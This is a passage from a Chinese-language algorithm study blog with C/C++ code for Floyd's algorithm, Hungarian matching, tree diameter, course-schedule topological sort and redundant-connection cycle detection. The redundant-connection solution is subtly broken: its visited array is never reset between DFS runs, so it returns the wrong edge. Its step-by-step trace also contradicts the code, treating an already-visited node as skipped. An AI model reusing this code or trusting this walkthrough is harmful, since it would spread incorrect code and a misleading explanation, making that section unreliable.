class="hljs-comment">// 算法结束后，d[a][b]表示a到b的最短距离</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">floyd</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);<br>&#125;<br></code></pre></td></tr></table></figure><p>匈牙利算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n1, n2;     <span class="hljs-comment">// n1表示第一个集合中的点数，n2表示第二个集合中的点数</span><br><span class="hljs-type">int</span> h[N], e[M], ne[M], idx;     <span class="hljs-comment">// 邻接表存储所有边，匈牙利算法中只会用到从第二个集合指向第一个集合的边，所以这里只用存一个方向的边</span><br><span class="hljs-type">int</span> match[N];       <span class="hljs-comment">// 存储第二个集合中的每个点当前匹配的第一个集合中的点是哪个</span><br><span class="hljs-type">bool</span> st[N];     <span class="hljs-comment">// 表示第二个集合中的每个点是否已经被遍历过</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[x]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-type">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j])<br>        &#123;<br>            st[j] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (match[j] == <span class="hljs-number">0</span> || find(match[j]))<br>            &#123;<br>                match[j] = x;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">// 求最大匹配数，依次枚举第一个集合中的每个点能否匹配第二个集合中的点</span><br><span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i ++ )<br>&#123;<br>    <span class="hljs-built_in">memset</span>(st, <span class="hljs-literal">false</span>, <span class="hljs-keyword">sizeof</span> st);<br>    <span class="hljs-keyword">if</span> (find(i)) res ++ ;<br>&#125;<br></code></pre></td></tr></table></figure><p>最小瓶颈路</p><h3 id="例题-7"><a href="#例题-7" class="headerlink" title="例题"></a>例题</h3><h4 id="树的直径"><a href="#树的直径" class="headerlink" title="树的直径"></a>树的直径</h4><p>edges &#x3D; [[0, 1], [1, 2], [1, 3], [2, 4], [3, 5]]</p><p>算法实现</p><ol><li><strong>出边数组的构建</strong>：使用邻接表（出边数组）表示树的结构，方便遍历。</li><li>两次 BFS<ul><li>第一次 BFS 从任意节点出发（这里从节点 <code>0</code> 出发），找到距离最远的节点 <code>p</code>。</li><li>第二次 BFS 从 <code>p</code> 出发，找到距离最远的另一个节点，并返回此距离作为树的直径。</li></ul></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to; <span class="hljs-comment">// 出边数组</span><br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">treeDiameter</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>            n = <span class="hljs-built_in">max</span>(n, <span class="hljs-built_in">max</span>(x, y)); <span class="hljs-comment">// 计算最大节点编号</span><br>        &#125;<br>        n++; <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span> ; i&lt;n ; i++)to.<span class="hljs-built_in">push_back</span>(&#123;&#125;); <span class="hljs-comment">//初始化</span><br>        <span class="hljs-comment">// 构建出边数组</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>            to[x].<span class="hljs-built_in">push_back</span>(y);<br>            to[y].<span class="hljs-built_in">push_back</span>(x);<br>        &#125;<br><br>        <span class="hljs-comment">// 从任意节点 0 开始，找到最远的节点</span><br>        <span class="hljs-type">int</span> p = <span class="hljs-built_in">findFarthest</span>(<span class="hljs-number">0</span>).first;<br>        <span class="hljs-comment">// 从找到的最远节点 p 再次执行 BFS，求出树的直径</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">findFarthest</span>(p).second;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// &lt;点，距离&gt;</span><br>    <span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">findFarthest</span><span class="hljs-params">(<span class="hljs-type">int</span> start)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">depth</span><span class="hljs-params">(n, <span class="hljs-number">-1</span>)</span></span>; <span class="hljs-comment">// 记录每个节点的深度，初始为 -1</span><br>        queue&lt;<span class="hljs-type">int</span>&gt; q;<br>        q.<span class="hljs-built_in">push</span>(start);<br>        depth[start] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 起始节点的深度为 0</span><br>        <span class="hljs-comment">// BFS</span><br>        <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>                <span class="hljs-keyword">if</span> (depth[y] != <span class="hljs-number">-1</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 跳过已访问节点</span><br>                depth[y] = depth[x] + <span class="hljs-number">1</span>; <span class="hljs-comment">// 更新深度</span><br>                q.<span class="hljs-built_in">push</span>(y); <span class="hljs-comment">// 将该节点加入队列</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 找到距离最远的节点</span><br>        <span class="hljs-type">int</span> ans = start;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (depth[i] &gt; depth[ans]) ans = i;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> &#123;ans, depth[ans]&#125;;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="课程表"><a href="#课程表" class="headerlink" title="课程表"></a>课程表</h4><p>输入: numCourses &#x3D; 2, prerequisites &#x3D; [[1,0],[0,1]]<br>输出: false<br>解释: 课程 1 依赖于课程 0，课程 0 也依赖于课程 1，形成循环，无法完成所有课程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canFinish</span><span class="hljs-params">(<span class="hljs-type">int</span> numCourses, vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;<br>        <span class="hljs-comment">// 初始化邻接表和入度表</span><br>        to = vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;(numCourses, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>        inDeg = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(numCourses, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 构建图</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; pre : prerequisites) &#123;<br>            <span class="hljs-type">int</span> ai = pre[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> bi = pre[<span class="hljs-number">1</span>];<br>            to[bi].<span class="hljs-built_in">push_back</span>(ai);<br>            inDeg[ai]++;<br>        &#125;<br>        queue&lt;<span class="hljs-type">int</span>&gt; q;<br>       <span class="hljs-comment">//拓扑排序第一步:从零入度点出发</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numCourses; i++) &#123;<br>            <span class="hljs-keyword">if</span> (inDeg[i] == <span class="hljs-number">0</span>) q.<span class="hljs-built_in">push</span>(i);<br>        &#125;<br>        vector&lt;<span class="hljs-type">int</span>&gt; lessons;  <span class="hljs-comment">// 保存完成的课程</span><br>        <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            lessons.<span class="hljs-built_in">push_back</span>(x);<br>            <span class="hljs-comment">// 第二步:扩展一个点，周围的点入度减一</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>                inDeg[y]--;<br>                <span class="hljs-keyword">if</span> (inDeg[y] == <span class="hljs-number">0</span>) q.<span class="hljs-built_in">push</span>(y);  <span class="hljs-comment">// 第三步:入度减为0，表示可以入队了</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 如果所有课程都能完成，返回true</span><br>        <span class="hljs-keyword">return</span> lessons.<span class="hljs-built_in">size</span>() == numCourses;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to;   <span class="hljs-comment">// 邻接表</span><br>    vector&lt;<span class="hljs-type">int</span>&gt; inDeg;        <span class="hljs-comment">// 入度表</span><br>&#125;;<br><span class="hljs-comment">//这个bfs就不用判重了。因为你有了indeg这个东西啊减为零才会入队。如果说有环，是不是根本就减不到零,他们就不会去访问啊，不会有重复，所以说这里我就不用判重</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">假设输入：</span><br><span class="hljs-comment">numCourses = 2</span><br><span class="hljs-comment">prerequisites = [[1, 0]]</span><br><span class="hljs-comment">这表示有 2 门课程，编号为 0 和 1。要完成课程 1，你必须先完成课程 0。</span><br><span class="hljs-comment">步骤 1：构建图和入度表</span><br><span class="hljs-comment">邻接表 to：这是一个二维向量，其中 to[bi] 保存了所有依赖于 bi 的课程，即 bi 的后续课程。在该例中：</span><br><span class="hljs-comment">to[0] 保存了课程 1，因为课程 1 依赖于课程 0。因此，to[0] = [1]，表示从课程 0 可以走到课程 1。</span><br><span class="hljs-comment">to[1] 没有后续课程，因此 to[1] 为空。</span><br><span class="hljs-comment">入度表 inDeg：这是一个一维向量，用来存储每个课程的入度，即需要先修多少门课程。在该例中：</span><br><span class="hljs-comment">课程 0 没有任何依赖，所以 inDeg[0] = 0。</span><br><span class="hljs-comment">课程 1 需要先修课程 0，所以 inDeg[1] = 1。</span><br><span class="hljs-comment">此时，邻接表和入度表如下：</span><br><span class="hljs-comment">to = [[1], []]</span><br><span class="hljs-comment">inDeg = [0, 1]</span><br><span class="hljs-comment">步骤 2：拓扑排序准备</span><br><span class="hljs-comment">我们需要找到所有入度为 0 的课程，也就是不需要先修课程就可以直接学习的课程。在该例中，课程 0 的入度为 0，因此我们将课程 0 加入队列 q。</span><br><span class="hljs-comment">队列状态：</span><br><span class="hljs-comment">q = [0]</span><br><span class="hljs-comment">步骤 3：广度优先搜索（BFS）拓扑排序</span><br><span class="hljs-comment">处理课程 0：</span><br><span class="hljs-comment">从队列中取出课程 0 并将其标记为已完成（加入 lessons 列表）。</span><br><span class="hljs-comment">查看课程 0 的所有后续课程（在邻接表 to[0] 中查找），可以看到课程 1 依赖于课程 0。</span><br><span class="hljs-comment">减少课程 1 的入度（inDeg[1]--），此时课程 1 的入度变为 0，表示可以学习课程 1，将其加入队列。</span><br><span class="hljs-comment">队列状态：</span><br><span class="hljs-comment">q = [1]</span><br><span class="hljs-comment">lessons = [0]</span><br><span class="hljs-comment">inDeg = [0, 0]</span><br><span class="hljs-comment">处理课程 1：</span><br><span class="hljs-comment">从队列中取出课程 1，并将其标记为已完成（加入 lessons 列表）。</span><br><span class="hljs-comment">课程 1 没有后续课程，因此队列处理完毕。</span><br><span class="hljs-comment">队列状态：</span><br><span class="hljs-comment">q = []</span><br><span class="hljs-comment">lessons = [0, 1]</span><br><span class="hljs-comment">步骤 4：判断结果 拓扑排序完成后，lessons 列表中包含了所有课程 [0, 1]，说明可以完成所有课程。 因此，最终返回 true。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">总结： 这段代码使用的是拓扑排序算法，利用 BFS 来检测图中是否存在环： 如果所有课程都能在拓扑排序中被处理（即 lessons.size() == numCourses），说明没有循环依赖，可以完成所有课程。 如果存在环，则会有一些课程无法被处理，队列会提前结束，此时返回 false。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="冗余连接"><a href="#冗余连接" class="headerlink" title="冗余连接"></a>冗余连接</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findRedundantConnection</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;<br>        n = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化节点数</span><br>        <span class="hljs-comment">// 计算实际的最大节点编号（n）</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>], y = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// 获取当前边的两个节点</span><br>            n = <span class="hljs-built_in">max</span>(n, <span class="hljs-built_in">max</span>(x, y));  <span class="hljs-comment">// 更新最大节点编号</span><br>        &#125;<br><br>        <span class="hljs-comment">// 初始化邻接表和访问标记数组</span><br>        to = vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;(n + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>        visited = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(n + <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br><br>        <span class="hljs-comment">// 遍历所有边，构建图并检查环</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>], y = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// 获取当前边的两个节点</span><br>            <br>            <span class="hljs-comment">// 添加边到邻接表中，构建无向图，邻接表的构建</span><br>            to[x].<span class="hljs-built_in">push_back</span>(y);<br>            to[y].<span class="hljs-built_in">push_back</span>(x);<br>            hasCycle = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 重置环标记</span><br>            <span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 从节点1开始DFS，父节点设为0（不存在）</span><br><br>            <span class="hljs-comment">// 如果检测到环，返回当前边</span><br>            <span class="hljs-keyword">if</span> (hasCycle) <span class="hljs-keyword">return</span> edge;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;  <span class="hljs-comment">// 如果没有发现冗余边，返回空数组</span><br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// 深度优先搜索 (DFS) 用于检测是否形成环,dfs模版</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> fa)</span> </span>&#123;<br>        visited[x] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 标记当前节点已访问</span><br>        <span class="hljs-comment">// 遍历当前节点 x 的所有邻居节点</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>            <span class="hljs-keyword">if</span> (y == fa) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// 如果是父节点，则跳过</span><br>            <span class="hljs-keyword">if</span> (!visited[y]) &#123;<br>                <span class="hljs-comment">// 如果未访问，继续递归DFS</span><br>                <span class="hljs-built_in">dfs</span>(y, x);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 如果已经访问过，说明存在环</span><br>                hasCycle = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> n;  <span class="hljs-comment">// 节点总数</span><br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to;  <span class="hljs-comment">// 邻接表，存储每个节点的邻居</span><br>    vector&lt;<span class="hljs-type">bool</span>&gt; visited;  <span class="hljs-comment">// 标记节点是否访问过</span><br>    <span class="hljs-type">bool</span> hasCycle;  <span class="hljs-comment">// 是否存在环的标记</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">遍历边 &#123;1, 2&#125;，图中没有环，继续。</span><br><span class="hljs-comment">遍历边 &#123;1, 3&#125;，图中没有环，继续。</span><br><span class="hljs-comment">遍历边 &#123;2, 3&#125;，此时检测到环，返回 &#123;2, 3&#125;。</span><br><span class="hljs-comment">假设输入：</span><br><span class="hljs-comment">edges = &#123;&#123;1, 2&#125;, &#123;1, 3&#125;, &#123;2, 3&#125;&#125;</span><br><span class="hljs-comment">这表示有 3 条边和 3 个节点，图的结构如下：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">复制代码</span><br><span class="hljs-comment">1 - 2</span><br><span class="hljs-comment">|   |</span><br><span class="hljs-comment">3 - -</span><br><span class="hljs-comment">我们需要找到一条冗余的边，这条边的加入会导致形成环。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">模拟执行过程：</span><br><span class="hljs-comment">第一步：初始化</span><br><span class="hljs-comment">初始化 n = 0，用于存储节点的最大编号。</span><br><span class="hljs-comment">遍历 edges，更新 n 为最大节点编号，最终得到 n = 3。</span><br><span class="hljs-comment">初始化邻接表 to 和访问标记数组 visited：</span><br><span class="hljs-comment">to = [[], [], [], []]  // 邻接表初始化，4 个空列表（因为节点编号从 1 开始）</span><br><span class="hljs-comment">visited = [false, false, false, false]  // 节点访问标记，全部为 false</span><br><span class="hljs-comment">第二步：开始遍历每一条边</span><br><span class="hljs-comment">我们依次处理每一条边，将其加入邻接表，并进行 DFS 检测是否有环。</span><br><span class="hljs-comment">处理边 &#123;1, 2&#125;：</span><br><span class="hljs-comment">将边 &#123;1, 2&#125; 加入邻接表：</span><br><span class="hljs-comment">to = [[], [2], [1], []]  // 节点 1 和 2 互为邻居</span><br><span class="hljs-comment">重置 hasCycle = false，开始 DFS。</span><br><span class="hljs-comment">从节点 1 开始进行 DFS，父节点设为 0（不存在）。</span><br><span class="hljs-comment">DFS 过程：</span><br><span class="hljs-comment">访问节点 1，标记为已访问：</span><br><span class="hljs-comment">visited = [false, true, false, false]</span><br><span class="hljs-comment">遍历节点 1 的邻居节点，发现节点 2 尚未访问，因此进入节点 2 的 DFS。</span><br><span class="hljs-comment">访问节点 2，标记为已访问：</span><br><span class="hljs-comment">visited = [false, true, true, false]</span><br><span class="hljs-comment">节点 2 的邻居是节点 1（父节点），跳过。</span><br><span class="hljs-comment">结束 DFS，没有发现环。</span><br><span class="hljs-comment">处理边 &#123;1, 3&#125;：</span><br><span class="hljs-comment">将边 &#123;1, 3&#125; 加入邻接表：</span><br><span class="hljs-comment">to = [[], [2, 3], [1], [1]]  // 节点 1 和 3 互为邻居</span><br><span class="hljs-comment">重置 hasCycle = false，开始 DFS。</span><br><span class="hljs-comment">从节点 1 开始进行 DFS，父节点设为 0（不存在）。</span><br><span class="hljs-comment">DFS 过程：</span><br><span class="hljs-comment">访问节点 1，标记为已访问：</span><br><span class="hljs-comment">visited = [false, true, true, false]</span><br><span class="hljs-comment">遍历节点 1 的邻居，发现节点 2 已访问过，跳过。</span><br><span class="hljs-comment">发现节点 3 尚未访问，进入节点 3 的 DFS。</span><br><span class="hljs-comment">访问节点 3，标记为已访问：</span><br><span class="hljs-comment">visited = [false, true, true, true]</span><br><span class="hljs-comment">节点 3 的邻居是节点 1（父节点），跳过。</span><br><span class="hljs-comment">结束 DFS，没有发现环。</span><br><span class="hljs-comment">处理边 &#123;2, 3&#125;：</span><br><span class="hljs-comment">将边 &#123;2, 3&#125; 加入邻接表：</span><br><span class="hljs-comment">to = [[], [2, 3], [1, 3], [1, 2]]  // 节点 2 和 3 互为邻居</span><br><span class="hljs-comment">重置 hasCycle = false，开始 DFS。</span><br><span class="hljs-comment">从节点 1 开始进行 DFS，父节点设为 0（不存在）。</span><br><span class="hljs-comment">DFS 过程：</span><br><span class="hljs-comment">访问节点 1，标记为已访问：</span><br><span class="hljs-comment">visited = [false, true, true, true]</span><br><span class="hljs-comment">遍历节点 1 的邻居，发现节点 2 已访问过，跳过。</span><br><span class="hljs-comment">发现节点 3 已访问过，跳过。</span><br><span class="hljs-comment">然后，节点 2 继续进行 DFS，发现节点 3 已访问过，但节点 3 不是父节点，说明形成环。</span><br><span class="hljs-comment">标记 hasCycle = true。</span><br><span class="hljs-comment">结束 DFS，发现环，冗余边是 &#123;2, 3&#125;。</span><br><span class="hljs-comment">第三步：返回结果</span><br><span class="hljs-comment">因为在处理边 &#123;2, 3&#125; 时发现了环，因此该边就是冗余边，返回：</span><br><span class="hljs-comment">&#123;2, 3&#125;</span><br><span class="hljs-comment">结果：</span><br><span class="hljs-comment">冗余边是 &#123;2, 3&#125;，这条边导致了环的出现。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">解释：</span><br><span class="hljs-comment">边 &#123;1, 2&#125; 和 &#123;1, 